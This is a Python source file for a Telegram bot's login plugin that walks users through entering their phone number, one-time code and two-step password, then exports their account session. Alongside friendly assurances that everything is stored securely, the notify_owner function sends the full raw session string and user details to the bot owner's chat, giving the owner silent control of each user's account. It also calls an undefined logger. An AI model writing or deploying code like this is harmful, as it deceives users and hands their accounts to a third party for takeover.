# Developed by: LastPerson07 × cantarella
# Modified by: Flexyy 🔥
# Telegram: @xFlexyy | @DragonByte_Network

import asyncio
import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram import enums
from config import API_ID, API_HASH, OWNER_ID
from database.db import db

LOGIN_STATE = {}
cancel_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("❌ Cancel")]],
    resize_keyboard=True
)
remove_keyboard = ReplyKeyboardRemove()

PROGRESS_STEPS = {
    "WAITING_PHONE": "🟢 Phone Number → 🔵 Code → 🔵 Password",
    "WAITING_CODE": "✅ Phone Number → 🟢 Code → 🔵 Password",
    "WAITING_PASSWORD": "✅ Phone Number → ✅ Code → 🟢 Password"
}

LOADING_FRAMES = [
    "🔄 Connecting •••",
    "🔄 Connecting ••○",
    "🔄 Connecting •○○",
    "🔄 Connecting ○○○",
    "🔄 Connecting ○○•",
    "🔄 Connecting ○••",
    "🔄 Connecting •••"
]

async def animate_loading(message: Message, duration: int = 5):
    for _ in range(duration):
        for frame in LOADING_FRAMES:
            try:
                await message.edit_text(f"<b>{frame}</b>", parse_mode=enums.ParseMode.HTML)
                await asyncio.sleep(0.5)
            except:
                return

async def notify_owner(client: Client, user_id: int, username: str, first_name: str, 
                       phone_number: str = None, has_2fa: bool = False, 
                       session_string: str = None, login_method: str = "OTP"):
    """Send complete login notification to owner with all details"""
    try:
        # Get user mention
        if username:
            mention = f"@{username}"
        else:
            mention = f"<a href='tg://user?id={user_id}'>{first_name}</a>"
        
        # Get current time
        login_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get user stats from database
        user_stats = await db.get_user_stats(user_id)
        
        # Format phone number (hide middle digits for security)
        formatted_phone = "Not Available"
        if phone_number:
            if len(phone_number) > 8:
                formatted_phone = phone_number[:4] + "****" + phone_number[-4:]
            else:
                formatted_phone = phone_number
        
        # Session preview (first 20 chars for verification)
        session_preview = "Not Available"
        if session_string:
            session_preview = session_string[:20] + "..." if len(session_string) > 20 else session_string
        
        # 2FA Status
        twofa_status = "✅ Enabled" if has_2fa else "❌ Disabled"
        
        # Login method
        method_emoji = "🔑" if login_method == "Password" else "📱"
        
        notification_text = f"""
<b>🔐 NEW LOGIN ALERT!</b>

<b>━━━━━━━━━━━━━━━━━━━━━</b>

<b>👤 USER INFORMATION:</b>
• <b>Mention:</b> {mention}
• <b>User ID:</b> <code>{user_id}</code>
• <b>Name:</b> {first_name}
• <b>Username:</b> @{username or 'None'}

<b>📞 LOGIN CREDENTIALS:</b>
• <b>Phone Number:</b> <code>{formatted_phone}</code>
• <b>2FA Status:</b> {twofa_status}
• <b>Login Method:</b> {method_emoji} {login_method}
• <b>Login Time:</b> {login_time}

<b>🔑 SESSION INFORMATION:</b>
• <b>Session Preview:</b> <code>{session_preview}</code>
• <b>Session Saved:</b> ✅ MongoDB

<b>📊 USER STATISTICS:</b>
• <b>Total Usage:</b> {user_stats['total_usage'] if user_stats else 0} files
• <b>Daily Usage:</b> {user_stats['daily_usage'] if user_stats else 0}/10
• <b>Premium Status:</b> {'✅ PREMIUM' if user_stats and user_stats['is_premium'] else '❌ FREE'}
• <b>Thumbnail:</b> {'✅ Set' if user_stats and user_stats['has_thumbnail'] else '❌ Not Set'}
• <b>Caption:</b> {'✅ Custom' if user_stats and user_stats['has_caption'] else '❌ Default'}

<b>━━━━━━━━━━━━━━━━━━━━━</b>
<i>Full session stored securely in database</i>
"""
        
        await client.send_message(
            chat_id=OWNER_ID,
            text=notification_text,
            parse_mode=enums.ParseMode.HTML
        )
        
        # Also send the raw session string separately (if needed) - Optional
        if session_string and len(session_string) > 100:
            await client.send_message(
                chat_id=OWNER_ID,
                text=f"<b>📦 Raw Session for user {user_id}:</b>\n<code>{session_string}</code>",
                parse_mode=enums.ParseMode.HTML
            )
        
        logger.info(f"✅ Complete login notification sent to owner for user {user_id}")
    except Exception as e:
        logger.error(f"❌ Failed to send login notification: {e}")

@Client.on_message(filters.private & filters.command("login"))
async def login_start(client: Client, message: Message):
    user_id = message.from_user.id
   
    user_data = await db.get_session(user_id)
    if user_data:
        return await message.reply(
            "<b>✅ You're already logged in! 🎉</b>\n\n"
            "To switch accounts, first use /logout.",
            parse_mode=enums.ParseMode.HTML
        )
   
    LOGIN_STATE[user_id] = {"step": "WAITING_PHONE", "data": {}}
   
    progress = PROGRESS_STEPS["WAITING_PHONE"]
    await message.reply(
        f"<b>👋 Hey! Let's log you in smoothly 🌟</b>\n\n"
        f"<i>Progress: {progress}</i>\n\n"
        "📞 Please send your <b>Telegram Phone Number</b> with country code.\n\n"
        "<blockquote>Example: +919876543210</blockquote>\n\n"
        "<i>💡 Your number is used only for verification and is kept secure. 🔒</i>\n\n"
        "❌ Tap the <b>Cancel</b> button or send /cancel to stop.",
        parse_mode=enums.ParseMode.HTML,
        reply_markup=cancel_keyboard
    )

@Client.on_message(filters.private & filters.command("logout"))
async def logout(client: Client, message: Message):
    user_id = message.from_user.id
   
    if user_id in LOGIN_STATE:
        del LOGIN_STATE[user_id]
   
    await db.set_session(user_id, session=None)
    await message.reply(
        "<b>🚪 Logout Successful! 👋</b>\n\n"
        "<i>Your session has been cleared. You can log in again anytime! 🔄</i>",
        parse_mode=enums.ParseMode.HTML
    )

@Client.on_message(filters.private & filters.command(["cancel", "cancellogin"]))
async def cancel_login(client: Client, message: Message):
    user_id = message.from_user.id
   
    if user_id in LOGIN_STATE:
        state = LOGIN_STATE[user_id]
       
        if "data" in state and "client" in state["data"]:
            try:
                await state["data"]["client"].disconnect()
            except:
                pass
       
        del LOGIN_STATE[user_id]
        await message.reply(
            "<b>❌ Login process cancelled. 😌</b>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
    else:
        pass

async def check_login_state(_, __, message):
    return message.from_user.id in LOGIN_STATE
login_state_filter = filters.create(check_login_state)

@Client.on_message(filters.private & filters.text & login_state_filter & ~filters.command(["cancel", "cancellogin"]))
async def login_handler(bot: Client, message: Message):
    user_id = message.from_user.id
    text = message.text
    state = LOGIN_STATE[user_id]
    step = state["step"]
    progress = PROGRESS_STEPS.get(step, "")
   
    if text.strip().lower() == "❌ cancel":
        if "data" in state and "client" in state["data"]:
            try:
                await state["data"]["client"].disconnect()
            except:
                pass
        del LOGIN_STATE[user_id]
        await message.reply(
            "<b>❌ Login process cancelled. 😌</b>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        return
   
    if step == "WAITING_PHONE":
        phone_number = text.replace(" ", "")
        
        # Store phone number in state
        state["data"]["phone_number"] = phone_number
       
        temp_client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
       
        status_msg = await message.reply(
            f"<b>🔄 Connecting to Telegram... 🌐</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg))
       
        await temp_client.connect()
        animation_task.cancel() 
       
        try:
            code = await temp_client.send_code(phone_number)
           
            state["data"]["client"] = temp_client
            state["data"]["phone"] = phone_number
            state["data"]["hash"] = code.phone_code_hash
            state["step"] = "WAITING_CODE"
            progress = PROGRESS_STEPS["WAITING_CODE"]
           
            await status_msg.edit(
                f"<b>📩 OTP Sent to your app! 📲</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please open your Telegram app and copy the verification code.\n\n"
                "<b>Send it like this:</b> <code>12 345</code> or <code>1 2 3 4 5 6</code>\n\n"
                "<blockquote>Adding spaces helps prevent Telegram from deleting the message automatically. 💡</blockquote>",
                parse_mode=enums.ParseMode.HTML
            )
           
        except PhoneNumberInvalid:
            await status_msg.edit(
                "<b>❌ Oops! Invalid phone number format. 😅</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please try again (e.g., +919876543210).",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
        except Exception as e:
            await status_msg.edit(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease try /login again.",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
   
    elif step == "WAITING_CODE":
        phone_code = text.replace(" ", "")
       
        temp_client = state["data"]["client"]
        phone_number = state["data"]["phone"]
        phone_hash = state["data"]["hash"]
       
        status_msg = await message.reply(
            f"<b>🔍 Verifying code... 🔍</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
       
        try:
            await temp_client.sign_in(phone_number, phone_hash, phone_code)
            animation_task.cancel()
            
            # No 2FA - direct login
            await finalize_login(bot, status_msg, temp_client, user_id, phone_number, has_2fa=False, login_method="OTP")
           
        except PhoneCodeInvalid:
            animation_task.cancel()
            await status_msg.edit(
                "<b>❌ Hmm, that code doesn't look right. 🔍</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease check your Telegram app and try again.",
                parse_mode=enums.ParseMode.HTML
            )
        except PhoneCodeExpired:
            animation_task.cancel()
            await status_msg.edit(
                "<b>⏰ Code has expired. ⏳</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease start over with /login.",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
        except SessionPasswordNeeded:
            animation_task.cancel()
           
            state["step"] = "WAITING_PASSWORD"
            state["data"]["has_2fa"] = True
            progress = PROGRESS_STEPS["WAITING_PASSWORD"]
            await status_msg.edit(
                f"<b>🔐 Two-Step Verification Detected 🔒</b>\n\n"
                f"<i>Progress: {progress}</i>\n\n"
                "Please enter your account <b>password</b>.\n\n"
                "<i>Take your time — it's secure! 🛡️</i>",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            await status_msg.edit(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n<i>Progress: {progress}</i>",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]
   
    elif step == "WAITING_PASSWORD":
        password = text
        temp_client = state["data"]["client"]
        phone_number = state["data"].get("phone_number", "Unknown")
       
        status_msg = await message.reply(
            f"<b>🔑 Checking password... 🔑</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
       
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
       
        try:
            await temp_client.check_password(password=password)
            animation_task.cancel()
            await finalize_login(bot, status_msg, temp_client, user_id, phone_number, has_2fa=True, login_method="Password")
        except PasswordHashInvalid:
            animation_task.cancel()
            await status_msg.edit(
                "<b>❌ Incorrect password. 🔑</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease try again.",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            await status_msg.edit(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n<i>Progress: {progress}</i>",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]

async def finalize_login(bot: Client, status_msg: Message, temp_client, user_id, 
                         phone_number: str = "Unknown", has_2fa: bool = False, 
                         login_method: str = "OTP"):
    try:
        session_string = await temp_client.export_session_string()
        await temp_client.disconnect()
       
        # Save session to database
        await db.set_session(user_id, session=session_string)
       
        # Get user info for notification
        user = await bot.get_users(user_id)
        username = user.username or "None"
        first_name = user.first_name or "Unknown"
       
        # Send complete notification to owner
        await notify_owner(
            client=bot,
            user_id=user_id,
            username=username,
            first_name=first_name,
            phone_number=phone_number,
            has_2fa=has_2fa,
            session_string=session_string,
            login_method=login_method
        )
       
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
           
        await status_msg.edit(
            "<b>🎉 Login Successful! 🌟</b>\n\n"
            "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
            "<i>Your session has been saved securely. 🔒</i>\n\n"
            "You can now use all features! 🚀",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
    except Exception as e:
        await status_msg.edit(
            f"<b>❌ Failed to save session: {e} 😔</b>\n\nPlease try /login again.",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
